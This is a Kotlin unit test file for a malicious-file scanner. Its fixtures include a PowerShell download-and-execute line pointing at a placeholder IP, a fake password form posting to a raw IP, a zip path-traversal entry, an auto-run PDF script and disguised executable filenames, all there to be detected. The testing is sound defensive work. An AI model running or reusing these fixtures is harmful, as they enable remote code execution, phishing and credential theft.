package com.nullsignal.core

import com.nullsignal.core.security.FileCheck
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class FileCheckTest {
    @get:Rule val tmp = TemporaryFolder()

    private fun file(bytes: ByteArray): File = tmp.newFile().also { it.writeBytes(bytes) }
    private fun zip(vararg names: String): File = tmp.newFile().also { f ->
        ZipOutputStream(f.outputStream()).use { z -> for (n in names) { z.putNextEntry(ZipEntry(n)); z.write("data-$n".toByteArray()); z.closeEntry() } }
    }
    private val png = byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A) + ByteArray(64)
    private val exe = byteArrayOf(0x4D, 0x5A) + ByteArray(200) { (it * 7).toByte() }
    private fun titles(r: FileCheck.Report) = r.findings.joinToString(" | ") { "${it.level}:${it.title}" }

    @Test fun cleanFiles() {
        var r = FileCheck.scan(file(png), "photo.png")
        assertEquals("картинка PNG", r.kind)
        assertEquals(0, r.level)
        r = FileCheck.scan(file("просто заметка\nвторая строка".toByteArray()), "notes.txt")
        assertEquals("текст", r.kind)
        assertEquals(0, r.level)
        assertEquals("5d41402abc4b2a76b9719d911017c592", FileCheck.scan(file("hello".toByteArray()), "a.txt").md5)
        assertEquals("2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824", FileCheck.scan(file("hello".toByteArray()), "a.txt").sha256)
        // m4a в контейнере MP4 и jpg, который на самом деле png, — не тревога
        val mp4 = ByteArray(4) + "ftypisom".toByteArray() + ByteArray(64)
        assertEquals(0, FileCheck.scan(file(mp4), "song.m4a").level)
        assertEquals(0, FileCheck.scan(file(png), "photo.jpg").level)
    }

    @Test fun disguisedPrograms() {
        var r = FileCheck.scan(file(exe), "photo.jpg")
        assertEquals(2, r.level)
        assertTrue(titles(r), r.findings.any { it.title.contains("притворяется") })
        r = FileCheck.scan(file(exe), "invoice.pdf.exe")
        assertTrue(titles(r), r.findings.any { it.title.contains("Двойное расширение") })
        r = FileCheck.scan(file(exe), "photo‮gpj.exe")
        assertTrue(titles(r), r.findings.any { it.title.contains("управляющий символ") })
        r = FileCheck.scan(file(exe), "report.doc          .exe")
        assertTrue(titles(r), r.findings.any { it.title.contains("пробелами") })
        r = FileCheck.scan(file(exe), "setup.exe")
        assertEquals(titles(r), 1, r.level)
    }

    @Test fun documents() {
        val pdf = "%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >>\n".toByteArray()
        var r = FileCheck.scan(file(pdf), "doc.pdf")
        assertEquals("документ PDF", r.kind)
        assertTrue(titles(r), r.findings.any { it.title.contains("JavaScript") } && r.findings.any { it.title.contains("при открытии") })
        assertEquals(0, FileCheck.scan(file("%PDF-1.4\n1 0 obj << /Type /Catalog >>".toByteArray()), "ok.pdf").level)

        r = FileCheck.scan(zip("[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"), "отчёт.docx")
        assertEquals("документ Word", r.kind)
        assertTrue(titles(r), r.findings.any { it.level == 2 && it.title.contains("макросы") })
        assertEquals(0, FileCheck.scan(zip("[Content_Types].xml", "word/document.xml"), "чистый.docx").level)

        r = FileCheck.scan(file("{\\rtf1 text {\\object\\objdata 0105000002}}".toByteArray()), "letter.rtf")
        assertTrue(titles(r), r.findings.any { it.title.contains("RTF") })

        val html = "<html><body><form action='http://203.0.113.9/x'><input type=\"password\" name=p></form></body></html>".toByteArray()
        r = FileCheck.scan(file(html), "bank-statement.pdf")
        assertTrue(titles(r), r.findings.any { it.title.contains("не совпадает") } && r.findings.any { it.title.contains("пароля") } && r.findings.any { it.title.contains("IP") })
        assertEquals(listOf("http://203.0.113.9/x"), r.urls)
    }

    @Test fun archivesAndApps() {
        var r = FileCheck.scan(zip("readme.txt", "../../evil.sh", "tools/run.exe"), "files.zip")
        assertEquals("архив ZIP", r.kind)
        assertEquals(3, r.entries.size)
        assertTrue(titles(r), r.findings.any { it.title.contains("выйти из своей папки") } && r.findings.any { it.title.contains("программы: 2") })

        r = FileCheck.scan(zip("AndroidManifest.xml", "classes.dex", "res/a.png"), "game.apk")
        assertEquals("приложение Android (APK)", r.kind)
        assertEquals(titles(r), 1, r.level)
        assertTrue(r.findings.any { it.title == "Установочный файл Android" })
        // тот же APK под видом картинки
        assertEquals(2, FileCheck.scan(zip("AndroidManifest.xml", "classes.dex"), "wallpaper.png").level)

        // зашифрованные записи: ставим бит шифрования в каталоге архива
        val z = zip("a.doc", "b.doc")
        val bytes = z.readBytes()
        for (i in 0 until bytes.size - 9) if (bytes[i] == 0x50.toByte() && bytes[i + 1] == 0x4B.toByte() && bytes[i + 2] == 1.toByte() && bytes[i + 3] == 2.toByte()) bytes[i + 8] = (bytes[i + 8].toInt() or 1).toByte()
        z.writeBytes(bytes)
        r = FileCheck.scan(z, "docs.zip")
        assertTrue(titles(r), r.findings.any { it.title.contains("под паролем") })
    }

    @Test fun scriptsAndStrings() {
        val ps = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1'); mail admin@example.org".toByteArray()
        val r = FileCheck.scan(file(ps), "update.ps1")
        assertEquals(titles(r), 2, r.level)
        assertEquals(listOf("http://198.51.100.7/a.ps1"), r.urls)
        assertEquals(listOf("198.51.100.7"), r.ips)
        assertEquals(listOf("admin@example.org"), r.emails)
        assertEquals(0.0, FileCheck.entropy(ByteArray(1000)), 0.0001)
        assertTrue(FileCheck.entropy(ByteArray(100_000).also { java.util.Random(1).nextBytes(it) }) > 7.9)
        val wide = "W\u0000i\u0000d\u0000e\u0000S\u0000t\u0000r\u0000".toByteArray(Charsets.ISO_8859_1)
        assertTrue(FileCheck.strings(byteArrayOf(1, 2) + "plain-text".toByteArray() + byteArrayOf(0, 3) + wide).containsAll(listOf("plain-text", "WideStr")))
        assertFalse(FileCheck.scan(file("just text with example.com".toByteArray()), "a.txt").findings.any { it.level > 0 })
    }
}
